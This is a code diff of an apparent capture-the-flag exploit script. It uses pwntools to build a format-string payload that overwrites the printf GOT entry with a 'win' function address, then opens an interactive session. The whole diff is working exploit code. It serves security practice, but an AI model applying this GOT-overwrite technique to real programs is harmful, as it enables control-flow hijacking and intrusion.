@@ -18,7 +18,11 @@ offset = autofmt.offset
 
 print(offset)
 
-payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
+TARGET = elf.got['printf']
+WIN    = elf.symbols['win']
 
-p.sendline(payload)
-print(p.recvall().decode('latin-1'))
+payload = fmtstr_payload(offset, {TARGET: WIN}, write_size='short')
+
+io.sendline(payload)
+print(io.recvall(timeout=1).decode(errors="ignore"))
+io.interactive()
